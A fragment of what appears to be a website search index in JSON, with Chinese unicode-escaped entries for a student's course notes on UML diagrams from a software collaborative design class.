\u80cc\u666f","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/7.UML%E5%9B%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#1","text":"\u6700\u8fd1\u5728\u300a\u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1\u300b\u8bfe\u7a0b\u4e2d\u5b66\u4e60\u4e86UML\u56fe\uff0c\u5728\u6b64\u8fdb\u884c\u603b\u7ed3\u3002","title":"1. \u80cc\u666f"}]}